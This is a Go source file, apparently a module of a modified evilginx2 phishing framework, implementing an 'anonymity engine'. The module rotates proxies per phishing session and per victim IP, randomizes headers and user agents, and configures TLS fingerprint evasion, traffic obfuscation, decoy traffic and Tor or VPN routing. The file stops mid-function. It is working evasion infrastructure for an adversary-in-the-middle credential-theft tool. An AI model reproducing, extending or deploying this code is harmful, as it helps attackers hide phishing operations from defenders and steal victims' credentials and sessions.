package core

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
	"github.com/oschwald/geoip2-golang"
)

// AnonymityEngine provides advanced anonymity and stealth capabilities
type AnonymityEngine struct {
	config            *AnonymityConfig
	proxyRotator      *ProxyRotator
	headerRandomizer  *HeaderRandomizer
	trafficObfuscator *TrafficObfuscator
	ipMasker          *IPMasker
	userAgentRotator  *UserAgentRotator
	mu                sync.RWMutex
}

// AnonymityConfig contains anonymity configuration
type AnonymityConfig struct {
	Enabled             bool                  `json:"enabled"`
	ProxyRotation       *ProxyRotationConfig  `json:"proxy_rotation"`
	HeaderRandomization *HeaderRandomConfig   `json:"header_randomization"`
	TrafficObfuscation  *TrafficObfuscConfig  `json:"traffic_obfuscation"`
	IPMasking           *IPMaskingConfig      `json:"ip_masking"`
	UserAgentRotation   *UserAgentConfig      `json:"user_agent_rotation"`
	DNSObfuscation      *DNSObfuscConfig      `json:"dns_obfuscation"`
	TLSFingerprinting   *TLSFingerprintConfig `json:"tls_fingerprinting"`
	TimingObfuscation   *TimingObfuscConfig   `json:"timing_obfuscation"`
}

// ProxyRotationConfig configures proxy rotation
type ProxyRotationConfig struct {
	Enabled          bool              `json:"enabled"`
	ProxyList        []ProxyInfo       `json:"proxy_list"`
	RotationInterval time.Duration     `json:"rotation_interval"`
	HealthCheck      bool              `json:"health_check"`
	FailoverEnabled  bool              `json:"failover_enabled"`
	LoadBalancing    string            `json:"load_balancing"` // "round_robin", "random", "least_used"
	MaxRetries       int               `json:"max_retries"`
	ProxyChaining    *ProxyChainConfig `json:"proxy_chaining"`
}

// ProxyInfo contains proxy server information
type ProxyInfo struct {
	Type        string            `json:"type"` // "http", "https", "socks4", "socks5", "socks5h"
	Host        string            `json:"host"`
	Port        int               `json:"port"`
	Username    string            `json:"username,omitempty"`
	Password    string            `json:"password,omitempty"`
	Country     string            `json:"country,omitempty"`
	Region      string            `json:"region,omitempty"`
	City        string            `json:"city,omitempty"` // Added for frontend compatibility
	LastChecked time.Time         `json:"last_checked"`   // Added for frontend tracking
	LastUsed    time.Time         `json:"last_used"`
	SuccessRate float64           `json:"success_rate"`
	Latency     time.Duration     `json:"latency"`
	Active      bool              `json:"active"`
	Metadata    map[string]string `json:"metadata,omitempty"`
	// Session-sticky proxy rotation fields
	InUse     bool   `json:"in_use"`               // Whether proxy is currently assigned to a session
	SessionID string `json:"session_id,omitempty"` // ID of session using this proxy
	Status    string `json:"status,omitempty"`     // "untested", "active", "failed", "in_use"
}

// ProxyChainConfig configures proxy chaining
type ProxyChainConfig struct {
	Enabled     bool `json:"enabled"`
	ChainLength int  `json:"chain_length"`
	RandomOrder bool `json:"random_order"`
}

// HeaderRandomConfig configures header randomization
type HeaderRandomConfig struct {
	Enabled                bool                `json:"enabled"`
	RandomizeUserAgent     bool                `json:"randomize_user_agent"`
	RandomizeAcceptHeaders bool                `json:"randomize_accept_headers"`
	AddFakeHeaders         bool                `json:"add_fake_headers"`
	RemoveFingerprints     bool                `json:"remove_fingerprints"`
	HeaderProfiles         []HeaderProfile     `json:"header_profiles"`
	CustomHeaders          map[string][]string `json:"custom_headers"`
}

// HeaderProfile represents a browser header profile
type HeaderProfile struct {
	Name        string            `json:"name"`
	UserAgent   string            `json:"user_agent"`
	Headers     map[string]string `json:"headers"`
	Probability float64           `json:"probability"`
	BrowserType string            `json:"browser_type"`
	Platform    string            `json:"platform"`
}

// TrafficObfuscConfig configures traffic obfuscation
type TrafficObfuscConfig struct {
	Enabled           bool                  `json:"enabled"`
	PayloadEncryption *PayloadEncryptConfig `json:"payload_encryption"`
	TrafficPadding    *TrafficPaddingConfig `json:"traffic_padding"`
	RequestSplitting  *RequestSplitConfig   `json:"request_splitting"`
	DecoyTraffic      *DecoyTrafficConfig   `json:"decoy_traffic"`
	ProtocolMimicry   *ProtocolMimicConfig  `json:"protocol_mimicry"`
}

// PayloadEncryptConfig configures payload encryption
type PayloadEncryptConfig struct {
	Enabled          bool   `json:"enabled"`
	Algorithm        string `json:"algorithm"` // "aes256", "chacha20", "rc4"
	KeyRotation      bool   `json:"key_rotation"`
	CompressionFirst bool   `json:"compression_first"`
}

// TrafficPaddingConfig configures traffic padding
type TrafficPaddingConfig struct {
	Enabled       bool `json:"enabled"`
	MinPadding    int  `json:"min_padding"`
	MaxPadding    int  `json:"max_padding"`
	RandomPadding bool `json:"random_padding"`
}

// RequestSplitConfig configures request splitting
type RequestSplitConfig struct {
	Enabled      bool `json:"enabled"`
	MaxChunkSize int  `json:"max_chunk_size"`
	RandomDelay  bool `json:"random_delay"`
	MinDelay     int  `json:"min_delay_ms"`
	MaxDelay     int  `json:"max_delay_ms"`
}

// DecoyTrafficConfig configures decoy traffic generation
type DecoyTrafficConfig struct {
	Enabled        bool     `json:"enabled"`
	TrafficRatio   float64  `json:"traffic_ratio"` // Ratio of decoy to real traffic
	DecoyDomains   []string `json:"decoy_domains"`
	PatternMimicry bool     `json:"pattern_mimicry"`
}

// ProtocolMimicConfig configures protocol mimicry
type ProtocolMimicConfig struct {
	Enabled       bool   `json:"enabled"`
	MimicProtocol string `json:"mimic_protocol"` // "http", "dns", "smtp", "ftp"
	TunnelMode    string `json:"tunnel_mode"`    // "encapsulation", "steganography"
}

// IPMaskingConfig configures IP masking
type IPMaskingConfig struct {
	Enabled        bool              `json:"enabled"`
	VPNIntegration *VPNConfig        `json:"vpn_integration"`
	TorIntegration *TorConfig        `json:"tor_integration"`
	CDNRouting     *CDNRoutingConfig `json:"cdn_routing"`
	IPv6Preference bool              `json:"ipv6_preference"`
}

// VPNConfig configures VPN integration
type VPNConfig struct {
	Enabled        bool               `json:"enabled"`
	Providers      []VPNProvider      `json:"providers"`
	AutoRotation   bool               `json:"auto_rotation"`
	KillSwitch     bool               `json:"kill_switch"`
	LeakProtection *LeakProtectConfig `json:"leak_protection"`
}

// VPNProvider represents a VPN service provider
type VPNProvider struct {
	Name      string            `json:"name"`
	Type      string            `json:"type"` // "openvpn", "wireguard", "ipsec"
	Endpoints []VPNEndpoint     `json:"endpoints"`
	Config    map[string]string `json:"config"`
}

// VPNEndpoint represents a VPN server endpoint
type VPNEndpoint struct {
	Host      string  `json:"host"`
	Port      int     `json:"port"`
	Country   string  `json:"country"`
	City      string  `json:"city"`
	Load      float64 `json:"load"`
	Latency   int     `json:"latency"`
	Available bool    `json:"available"`
}

// LeakProtectConfig configures leak protection
type LeakProtectConfig struct {
	DNSLeakProtection    bool `json:"dns_leak_protection"`
	IPv6LeakProtection   bool `json:"ipv6_leak_protection"`
	WebRTCLeakProtection bool `json:"webrtc_leak_protection"`
}

// TorConfig configures Tor integration
type TorConfig struct {
	Enabled         bool   `json:"enabled"`
	ControlPort     int    `json:"control_port"`
	SOCKSPort       int    `json:"socks_port"`
	NewCircuitTime  int    `json:"new_circuit_time"` // minutes
	ExitNodeCountry string `json:"exit_node_country,omitempty"`
	BridgeMode      bool   `json:"bridge_mode"`
	HiddenService   bool   `json:"hidden_service"`
}

// CDNRoutingConfig configures CDN-based routing
type CDNRoutingConfig struct {
	Enabled       bool           `json:"enabled"`
	Providers     []CDNProvider  `json:"providers"`
	EdgeLocations []EdgeLocation `json:"edge_locations"`
	RoutingRules  []RoutingRule  `json:"routing_rules"`
}

// CDNProvider represents a CDN service provider
type CDNProvider struct {
	Name   string            `json:"name"`
	APIKey string            `json:"api_key"`
	Zones  []CDNZone         `json:"zones"`
	Config map[string]string `json:"config"`
}

// CDNZone represents a CDN zone/domain
type CDNZone struct {
	Domain    string   `json:"domain"`
	ZoneID    string   `json:"zone_id"`
	EdgeNodes []string `json:"edge_nodes"`
	Status    string   `json:"status"`
}

// EdgeLocation represents a CDN edge location
type EdgeLocation struct {
	City        string     `json:"city"`
	Country     string     `json:"country"`
	Coordinates [2]float64 `json:"coordinates"`
	Load        float64    `json:"load"`
	Available   bool       `json:"available"`
}

// RoutingRule defines traffic routing rules
type RoutingRule struct {
	Source      string `json:"source"`
	Destination string `json:"destination"`
	Protocol    string `json:"protocol"`
	Action      string `json:"action"` // "route", "block", "redirect"
	Priority    int    `json:"priority"`
}

// UserAgentConfig configures user agent rotation
type UserAgentConfig struct {
	Enabled              bool             `json:"enabled"`
	RotationInterval     time.Duration    `json:"rotation_interval"`
	BrowserMimicry       bool             `json:"browser_mimicry"`
	PlatformMimicry      bool             `json:"platform_mimicry"`
	VersionRandomization bool             `json:"version_randomization"`
	UserAgentDatabase    []UserAgentEntry `json:"user_agent_database"`
}

// UserAgentEntry represents a user agent entry
type UserAgentEntry struct {
	UserAgent   string    `json:"user_agent"`
	Browser     string    `json:"browser"`
	Version     string    `json:"version"`
	Platform    string    `json:"platform"`
	Probability float64   `json:"probability"`
	LastUsed    time.Time `json:"last_used"`
}

// DNSObfuscConfig configures DNS obfuscation
type DNSObfuscConfig struct {
	Enabled          bool               `json:"enabled"`
	DOHServers       []DOHServer        `json:"doh_servers"`
	DOTServers       []DOTServer        `json:"dot_servers"`
	DNSOverHTTPS     bool               `json:"dns_over_https"`
	DNSOverTLS       bool               `json:"dns_over_tls"`
	DNSCrypt         bool               `json:"dns_crypt"`
	CustomResolvers  []DNSResolver      `json:"custom_resolvers"`
	QueryObfuscation *QueryObfuscConfig `json:"query_obfuscation"`
}

// DOHServer represents a DNS-over-HTTPS server
type DOHServer struct {
	Name     string `json:"name"`
	URL      string `json:"url"`
	Provider string `json:"provider"`
	Country  string `json:"country"`
	Active   bool   `json:"active"`
}

// DOTServer represents a DNS-over-TLS server
type DOTServer struct {
	Name     string `json:"name"`
	Host     string `json:"host"`
	Port     int    `json:"port"`
	Provider string `json:"provider"`
	Country  string `json:"country"`
	Active   bool   `json:"active"`
}

// DNSResolver represents a custom DNS resolver
type DNSResolver struct {
	Host     string `json:"host"`
	Port     int    `json:"port"`
	Protocol string `json:"protocol"` // "udp", "tcp", "doh", "dot"
	Priority int    `json:"priority"`
}

// QueryObfuscConfig configures DNS query obfuscation
type QueryObfuscConfig struct {
	Enabled           bool `json:"enabled"`
	RandomCaseQueries bool `json:"random_case_queries"`
	DNSPadding        bool `json:"dns_padding"`
	FakeQueries       bool `json:"fake_queries"`
}

// TLSFingerprintConfig configures TLS fingerprinting evasion
type TLSFingerprintConfig struct {
	Enabled                bool         `json:"enabled"`
	CipherSuiteRotation    bool         `json:"cipher_suite_rotation"`
	ExtensionRandomization bool         `json:"extension_randomization"`
	HelloRandomization     bool         `json:"hello_randomization"`
	CertificateChaining    bool         `json:"certificate_chaining"`
	SNIObfuscation         bool         `json:"sni_obfuscation"`
	TLSProfiles            []TLSProfile `json:"tls_profiles"`
}

// TLSProfile represents a TLS configuration profile
type TLSProfile struct {
	Name             string   `json:"name"`
	MinVersion       uint16   `json:"min_version"`
	MaxVersion       uint16   `json:"max_version"`
	CipherSuites     []uint16 `json:"cipher_suites"`
	CurvePreferences []uint16 `json:"curve_preferences"`
	Extensions       []TLSExt `json:"extensions"`
	Browser          string   `json:"browser"`
}

// TLSExt represents a TLS extension
type TLSExt struct {
	Type uint16 `json:"type"`
	Data []byte `json:"data"`
}

// TimingObfuscConfig configures timing obfuscation
type TimingObfuscConfig struct {
	Enabled            bool                 `json:"enabled"`
	RequestDelays      *DelayConfig         `json:"request_delays"`
	ResponseDelays     *DelayConfig         `json:"response_delays"`
	JitterEnabled      bool                 `json:"jitter_enabled"`
	HumanBehaviorMimic *BehaviorMimicConfig `json:"human_behavior_mimic"`
}

// DelayConfig configures delays
type DelayConfig struct {
	MinDelay     time.Duration `json:"min_delay"`
	MaxDelay     time.Duration `json:"max_delay"`
	Distribution string        `json:"distribution"` // "uniform", "normal", "exponential"
}

// BehaviorMimicConfig configures human behavior mimicking
type BehaviorMimicConfig struct {
	Enabled            bool         `json:"enabled"`
	ClickDelays        *DelayConfig `json:"click_delays"`
	TypingDelays       *DelayConfig `json:"typing_delays"`
	ScrollDelays       *DelayConfig `json:"scroll_delays"`
	PageReadTime       *DelayConfig `json:"page_read_time"`
	NavigationPatterns []NavPattern `json:"navigation_patterns"`
}

// NavPattern represents navigation patterns
type NavPattern struct {
	Name        string    `json:"name"`
	Steps       []NavStep `json:"steps"`
	Probability float64   `json:"probability"`
}

// NavStep represents a navigation step
type NavStep struct {
	Action string        `json:"action"` // "click", "scroll", "wait", "type"
	Target string        `json:"target"`
	Delay  time.Duration `json:"delay"`
	Data   string        `json:"data,omitempty"`
}

// Implementation classes
type ProxyRotator struct {
	config       *ProxyRotationConfig
	currentProxy int
	proxies      []ProxyInfo
	mu           sync.RWMutex
	client       *http.Client
}

type HeaderRandomizer struct {
	config   *HeaderRandomConfig
	profiles []HeaderProfile
	mu       sync.RWMutex
}

type TrafficObfuscator struct {
	config *TrafficObfuscConfig
	mu     sync.RWMutex
}

type IPMasker struct {
	config *IPMaskingConfig
	mu     sync.RWMutex
}

type UserAgentRotator struct {
	config     *UserAgentConfig
	userAgents []UserAgentEntry
	current    int
	mu         sync.RWMutex
}

// NewAnonymityEngine creates a new anonymity engine
func NewAnonymityEngine(config *AnonymityConfig) *AnonymityEngine {
	if config == nil {
		config = getDefaultAnonymityConfig()
	}

	ae := &AnonymityEngine{
		config:            config,
		proxyRotator:      NewProxyRotator(config.ProxyRotation),
		headerRandomizer:  NewHeaderRandomizer(config.HeaderRandomization),
		trafficObfuscator: NewTrafficObfuscator(config.TrafficObfuscation),
		ipMasker:          NewIPMasker(config.IPMasking),
		userAgentRotator:  NewUserAgentRotator(config.UserAgentRotation),
	}

	return ae
}

// GetAnonymizedClient returns an HTTP client with anonymization features
func (ae *AnonymityEngine) GetAnonymizedClient() *http.Client {
	if !ae.config.Enabled {
		return &http.Client{}
	}

	// Create transport with proxy if enabled
	transport := &http.Transport{
		TLSClientConfig: ae.getTLSConfig(),
		DialContext:     ae.getDialContext(),
	}

	if ae.config.ProxyRotation.Enabled {
		transport.Proxy = ae.proxyRotator.GetProxyFunc()
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}

	return client
}

// RandomizeHeaders applies header randomization to a request
func (ae *AnonymityEngine) RandomizeHeaders(req *http.Request) {
	if !ae.config.HeaderRandomization.Enabled {
		return
	}

	ae.headerRandomizer.RandomizeRequest(req)
}

// ObfuscateTraffic applies traffic obfuscation to request data
func (ae *AnonymityEngine) ObfuscateTraffic(data []byte) ([]byte, error) {
	if !ae.config.TrafficObfuscation.Enabled {
		return data, nil
	}

	return ae.trafficObfuscator.ObfuscateData(data)
}

// DeobfuscateTraffic removes traffic obfuscation from response data
func (ae *AnonymityEngine) DeobfuscateTraffic(data []byte) ([]byte, error) {
	if !ae.config.TrafficObfuscation.Enabled {
		return data, nil
	}

	return ae.trafficObfuscator.DeobfuscateData(data)
}

// RotateProxy rotates to the next proxy
func (ae *AnonymityEngine) RotateProxy() error {
	if !ae.config.ProxyRotation.Enabled {
		return fmt.Errorf("proxy rotation is disabled")
	}

	return ae.proxyRotator.RotateProxy()
}

// GetCurrentIP returns the current external IP address
func (ae *AnonymityEngine) GetCurrentIP() (string, error) {
	client := ae.GetAnonymizedClient()

	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

// TestAnonymization tests anonymization features
func (ae *AnonymityEngine) TestAnonymization() *AnonymizationTestResult {
	result := &AnonymizationTestResult{
		Timestamp: time.Now(),
		Tests:     make(map[string]bool),
		Details:   make(map[string]string),
	}

	// Test IP masking
	if ae.config.IPMasking.Enabled {
		ip, err := ae.GetCurrentIP()
		if err != nil {
			result.Tests["ip_masking"] = false
			result.Details["ip_masking"] = err.Error()
		} else {
			result.Tests["ip_masking"] = true
			result.Details["ip_masking"] = ip
		}
	}

	// Test proxy rotation
	if ae.config.ProxyRotation.Enabled {
		err := ae.RotateProxy()
		result.Tests["proxy_rotation"] = err == nil
		if err != nil {
			result.Details["proxy_rotation"] = err.Error()
		}
	}

	// Test header randomization
	if ae.config.HeaderRandomization.Enabled {
		result.Tests["header_randomization"] = true
		result.Details["header_randomization"] = "Headers will be randomized per request"
	}

	// Test user agent rotation
	if ae.config.UserAgentRotation.Enabled {
		ua := ae.userAgentRotator.GetRandomUserAgent()
		result.Tests["user_agent_rotation"] = ua != ""
		result.Details["user_agent_rotation"] = ua
	}

	return result
}

// AnonymizationTestResult contains test results
type AnonymizationTestResult struct {
	Timestamp time.Time         `json:"timestamp"`
	Tests     map[string]bool   `json:"tests"`
	Details   map[string]string `json:"details"`
}

// ProxyRotator implementation
func NewProxyRotator(config *ProxyRotationConfig) *ProxyRotator {
	if config == nil {
		config = &ProxyRotationConfig{Enabled: false}
	}

	pr := &ProxyRotator{
		config:       config,
		currentProxy: 0,
		proxies:      config.ProxyList,
	}

	if config.Enabled {
		go pr.healthCheckRoutine()
	}

	return pr
}

func (pr *ProxyRotator) GetProxyFunc() func(*http.Request) (*url.URL, error) {
	return func(req *http.Request) (*url.URL, error) {
		if !pr.config.Enabled || len(pr.proxies) == 0 {
			return nil, nil
		}

		pr.mu.RLock()
		currentProxy := pr.proxies[pr.currentProxy]
		pr.mu.RUnlock()

		var proxyURL *url.URL
		var err error

		switch currentProxy.Type {
		case "http", "https":
			proxyURL, err = url.Parse(fmt.Sprintf("%s://%s:%d",
				currentProxy.Type, currentProxy.Host, currentProxy.Port))
		case "socks5":
			// For SOCKS5, we need to create a custom dialer
			proxyURL, err = url.Parse(fmt.Sprintf("socks5://%s:%d",
				currentProxy.Host, currentProxy.Port))
		default:
			return nil, fmt.Errorf("unsupported proxy type: %s", currentProxy.Type)
		}

		if err != nil {
			return nil, err
		}

		// Add authentication if provided
		if currentProxy.Username != "" && currentProxy.Password != "" {
			proxyURL.User = url.UserPassword(currentProxy.Username, currentProxy.Password)
		}

		return proxyURL, nil
	}
}

func (pr *ProxyRotator) RotateProxy() error {
	pr.mu.Lock()
	defer pr.mu.Unlock()

	if len(pr.proxies) == 0 {
		return fmt.Errorf("no proxies available")
	}

	switch pr.config.LoadBalancing {
	case "round_robin":
		pr.currentProxy = (pr.currentProxy + 1) % len(pr.proxies)
	case "random":
		num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(pr.proxies))))
		pr.currentProxy = int(num.Int64())
	case "least_used":
		pr.currentProxy = pr.findLeastUsedProxy()
	default:
		pr.currentProxy = (pr.currentProxy + 1) % len(pr.proxies)
	}

	pr.proxies[pr.currentProxy].LastUsed = time.Now()
	log.Info("Rotated to proxy: %s:%d", pr.proxies[pr.currentProxy].Host, pr.proxies[pr.currentProxy].Port)

	return nil
}

func (pr *ProxyRotator) findLeastUsedProxy() int {
	leastUsed := 0
	for i, proxy := range pr.proxies {
		if proxy.LastUsed.Before(pr.proxies[leastUsed].LastUsed) {
			leastUsed = i
		}
	}
	return leastUsed
}

func (pr *ProxyRotator) healthCheckRoutine() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			pr.performHealthCheck()
		}
	}
}

func (pr *ProxyRotator) performHealthCheck() {
	for i := range pr.proxies {
		go func(index int) {
			start := time.Now()

			// Create test client with this proxy
			proxyURL, err := url.Parse(fmt.Sprintf("%s://%s:%d",
				pr.proxies[index].Type, pr.proxies[index].Host, pr.proxies[index].Port))
			if err != nil {
				pr.proxies[index].Active = false
				return
			}

			transport := &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
			}

			client := &http.Client{
				Transport: transport,
				Timeout:   10 * time.Second,
			}

			// Test proxy with a simple request
			_, err = client.Get("https://httpbin.org/ip")
			latency := time.Since(start)

			pr.mu.Lock()
			if err != nil {
				pr.proxies[index].Active = false
				pr.proxies[index].SuccessRate *= 0.9 // Decay success rate
				pr.proxies[index].Status = "failed"
			} else {
				pr.proxies[index].Active = true
				pr.proxies[index].SuccessRate = pr.proxies[index].SuccessRate*0.9 + 0.1 // Improve success rate
				pr.proxies[index].Latency = latency
				if !pr.proxies[index].InUse {
					pr.proxies[index].Status = "active"
				}
			}
			pr.mu.Unlock()
		}(i)
	}
}

// ============================================
// SESSION-STICKY PROXY ROTATION METHODS
// ============================================

// GetProxyForSession returns the proxy already assigned to a session (if any)
// This does NOT assign a new proxy - use GetAvailableProxy for that
func (pr *ProxyRotator) GetProxyForSession(sessionID string) *ProxyInfo {
	pr.mu.RLock()
	defer pr.mu.RUnlock()

	for i := range pr.proxies {
		if pr.proxies[i].SessionID == sessionID && pr.proxies[i].InUse {
			// Return a copy to avoid race conditions
			proxyCopy := pr.proxies[i]
			return &proxyCopy
		}
	}
	return nil
}

// GetAvailableProxy finds and reserves an available proxy for a session
// Returns a copy of the proxy info to avoid race conditions
// IMPORTANT: Call GetProxyForSession first to check if session already has a proxy
func (pr *ProxyRotator) GetAvailableProxy(sessionID string) (*ProxyInfo, error) {
	pr.mu.Lock()
	defer pr.mu.Unlock()

	if len(pr.proxies) == 0 {
		return nil, fmt.Errorf("no proxies configured in pool")
	}

	// FIRST: Check if this session already has a proxy assigned
	for i := range pr.proxies {
		if pr.proxies[i].SessionID == sessionID && pr.proxies[i].InUse {
			// Session already has a proxy - return it without assigning a new one
			proxyCopy := pr.proxies[i]
			log.Debug("proxy-pool: Reusing existing proxy %s:%d for session %s", proxyCopy.Host, proxyCopy.Port, sessionID)
			return &proxyCopy, nil
		}
	}

	// Find first available proxy that is active (or untested) and not in use
	for i := range pr.proxies {
		// Accept proxies that are: Active=true OR Status is untested/empty (new proxies)
		// Reject proxies that are: InUse=true OR Status="failed"
		isAvailable := !pr.proxies[i].InUse && pr.proxies[i].Status != "failed"
		isUsable := pr.proxies[i].Active || pr.proxies[i].Status == "untested" || pr.proxies[i].Status == ""

		if isAvailable && isUsable {
			pr.proxies[i].InUse = true
			pr.proxies[i].SessionID = sessionID
			pr.proxies[i].LastUsed = time.Now()
			pr.proxies[i].Status = "in_use"
			pr.proxies[i].Active = true // Mark as active since we're using it

			// Return a copy to avoid race conditions
			proxyCopy := pr.proxies[i]
			log.Info("proxy-pool: Assigned proxy %s:%d to session %s", proxyCopy.Host, proxyCopy.Port, sessionID)
			return &proxyCopy, nil
		}
	}

	return nil, fmt.Errorf("no available proxies in pool (all %d proxies are in use or inactive)", len(pr.proxies))
}

// ReleaseProxy marks a proxy as available again when session ends
func (pr *ProxyRotator) ReleaseProxy(host string, port int) {
	pr.mu.Lock()
	defer pr.mu.Unlock()

	for i := range pr.proxies {
		if pr.proxies[i].Host == host && pr.proxies[i].Port == port {
			sessionID := pr.proxies[i].SessionID
			pr.proxies[i].InUse = false
			pr.proxies[i].SessionID = ""
			if pr.proxies[i].Active {
				pr.proxies[i].Status = "active"
			}
			log.Info("proxy-pool: Released proxy %s:%d (was session %s)", host, port, sessionID)
			return
		}
	}
	log.Warning("proxy-pool: Attempted to release unknown proxy %s:%d", host, port)
}

// ReleaseProxyBySession releases proxy assigned to a specific session
func (pr *ProxyRotator) ReleaseProxyBySession(sessionID string) {
	pr.mu.Lock()
	defer pr.mu.Unlock()

	for i := range pr.proxies {
		if pr.proxies[i].SessionID == sessionID {
			pr.proxies[i].InUse = false
			pr.proxies[i].SessionID = ""
			if pr.proxies[i].Active {
				pr.proxies[i].Status = "active"
			}
			log.Info("proxy-pool: Released proxy %s:%d for session %s", pr.proxies[i].Host, pr.proxies[i].Port, sessionID)
			return
		}
	}
}

// ReleaseProxyByIP releases a proxy that was assigned to a victim IP address
// This is used for IP-based proxy routing where proxies are assigned to IPs, not sessions
// It properly resets the InUse flag so the proxy can be reused
func (pr *ProxyRotator) ReleaseProxyByIP(host string, port int, victimIP string) {
	pr.mu.Lock()
	defer pr.mu.Unlock()

	for i := range pr.proxies {
		if pr.proxies[i].Host == host && pr.proxies[i].Port == port {
			// Only release if this proxy was assigned to this IP (or has no session)
			// This prevents accidentally releasing a proxy that's now assigned to a different session
			if pr.proxies[i].SessionID == victimIP || pr.proxies[i].SessionID == "" {
				pr.proxies[i].InUse = false
				pr.proxies[i].SessionID = ""
				if pr.proxies[i].Active {
					pr.proxies[i].Status = "active"
				}
				log.Info("proxy-pool: Released proxy %s:%d (was IP %s)", host, port, victimIP)
			} else {
				log.Debug("proxy-pool: Proxy %s:%d is now assigned to session %s, not releasing for IP %s",
					host, port, pr.proxies[i].SessionID, victimIP)
			}
			return
		}
	}
	log.Debug("proxy-pool: Proxy %s:%d not found in pool (may have been removed)", host, port)
}

// GetProxyPool returns a copy of the current proxy pool for API/UI
func (pr *ProxyRotator) GetProxyPool() []ProxyInfo {
	pr.mu.RLock()
	defer pr.mu.RUnlock()

	// Return a copy to avoid race conditions
	poolCopy := make([]ProxyInfo, len(pr.proxies))
	copy(poolCopy, pr.proxies)
	return poolCopy
}

// SetProxyPool replaces the entire proxy pool (from UI/API)
func (pr *ProxyRotator) SetProxyPool(proxies []ProxyInfo) {
	pr.mu.Lock()
	defer pr.mu.Unlock()

	// Initialize status for new proxies - FORCE all proxies to be available
	for i := range proxies {
		// ALWAYS set Active=true and InUse=false for fresh pool
		// This ensures proxies are immediately usable
		proxies[i].Active = true
		proxies[i].InUse = false
		proxies[i].SessionID = ""
		proxies[i].Status = "active" // Force active status for immediate use

		log.Debug("proxy-pool: Reset proxy %d: %s:%d Active=%v InUse=%v Status=%s",
			i, proxies[i].Host, proxies[i].Port, proxies[i].Active, proxies[i].InUse, proxies[i].Status)
	}

	pr.proxies = proxies
	pr.config.ProxyList = proxies
	log.Info("proxy-pool: Updated pool with %d proxies (all reset to available)", len(proxies))
}

// AddProxy adds a single proxy to the pool
func (pr *ProxyRotator) AddProxy(proxy ProxyInfo) {
	pr.mu.Lock()
	defer pr.mu.Unlock()

	if proxy.Status == "" {
		proxy.Status = "untested"
	}
	if !proxy.Active {
		proxy.Active = true
	}

	pr.proxies = append(pr.proxies, proxy)
	pr.config.ProxyList = pr.proxies
	log.Info("proxy-pool: Added proxy %s:%d (type: %s)", proxy.Host, proxy.Port, proxy.Type)
}

// RemoveProxy removes a proxy from the pool by host:port
func (pr *ProxyRotator) RemoveProxy(host string, port int) bool {
	pr.mu.Lock()
	defer pr.mu.Unlock()

	for i := range pr.proxies {
		if pr.proxies[i].Host == host && pr.proxies[i].Port == port {
			// Don't remove if in use
			if pr.proxies[i].InUse {
				log.Warning("proxy-pool: Cannot remove proxy %s:%d - currently in use by session %s", host, port, pr.proxies[i].SessionID)
				return false
			}
			pr.proxies = append(pr.proxies[:i], pr.proxies[i+1:]...)
			pr.config.ProxyList = pr.proxies
			log.Info("proxy-pool: Removed proxy %s:%d", host, port)
			return true
		}
	}
	return false
}

// GetPoolStats returns statistics about the proxy pool
func (pr *ProxyRotator) GetPoolStats() map[string]interface{} {
	pr.mu.RLock()
	defer pr.mu.RUnlock()

	total := len(pr.proxies)
	active := 0
	inUse := 0
	failed := 0

	for _, p := range pr.proxies {
		if p.Active {
			active++
		}
		if p.InUse {
			inUse++
		}
		if p.Status == "failed" {
			failed++
		}
	}

	return map[string]interface{}{
		"total":     total,
		"active":    active,
		"in_use":    inUse,
		"available": active - inUse,
		"failed":    failed,
	}
}

// IsEnabled returns whether proxy rotation is enabled
func (pr *ProxyRotator) IsEnabled() bool {
	return pr.config != nil && pr.config.Enabled
}

// HasAvailableProxies checks if there are any proxies that can be used
// Returns true if there's at least one proxy that is active (or untested) and not in use
func (pr *ProxyRotator) HasAvailableProxies() bool {
	pr.mu.RLock()
	defer pr.mu.RUnlock()

	if len(pr.proxies) == 0 {
		return false
	}

	for _, p := range pr.proxies {
		// A proxy is available if it's active (or untested) and not currently in use
		if (p.Active || p.Status == "untested" || p.Status == "") && !p.InUse {
			return true
		}
	}
	return false
}

// GetProxyCount returns the total number of proxies in the pool
func (pr *ProxyRotator) GetProxyCount() int {
	pr.mu.RLock()
	defer pr.mu.RUnlock()
	return len(pr.proxies)
}

// SetEnabled enables or disables proxy rotation
func (pr *ProxyRotator) SetEnabled(enabled bool) {
	pr.mu.Lock()
	wasEnabled := pr.config != nil && pr.config.Enabled
	if pr.config != nil {
		pr.config.Enabled = enabled
	}
	pr.mu.Unlock()

	log.Info("proxy-pool: Session-sticky rotation %s", map[bool]string{true: "enabled", false: "disabled"}[enabled])

	// Start health check routine when enabling (if not already running)
	if enabled && !wasEnabled {
		go pr.healthCheckRoutine()
		// Run immediate health check on all proxies when pool is enabled
		go pr.performHealthCheck()
		log.Info("proxy-pool: Started automatic health checking (every 5 minutes)")
	}

	// Notify callback when pool is enabled/disabled (for auto-setting single proxy)
	if proxyPoolEnabledCallback != nil {
		proxyPoolEnabledCallback(enabled)
	}
}

// GetFirstWorkingProxy returns the first active/healthy proxy from the pool
// Returns nil if no working proxy is available
func (pr *ProxyRotator) GetFirstWorkingProxy() *ProxyInfo {
	pr.mu.RLock()
	defer pr.mu.RUnlock()

	// First, try to find an active proxy that's not in use
	for i := range pr.proxies {
		if pr.proxies[i].Status == "active" && !pr.proxies[i].InUse {
			proxyCopy := pr.proxies[i]
			return &proxyCopy
		}
	}

	// If all active proxies are in use, return any active proxy
	for i := range pr.proxies {
		if pr.proxies[i].Status == "active" {
			proxyCopy := pr.proxies[i]
			return &proxyCopy
		}
	}

	// If no active proxies, try untested ones
	for i := range pr.proxies {
		if pr.proxies[i].Status == "" || pr.proxies[i].Status == "untested" {
			proxyCopy := pr.proxies[i]
			return &proxyCopy
		}
	}

	return nil
}

// Callback for when proxy pool is enabled/disabled
var proxyPoolEnabledCallback func(enabled bool)

// SetProxyPoolEnabledCallback sets the callback function called when pool is enabled/disabled
func SetProxyPoolEnabledCallback(callback func(enabled bool)) {
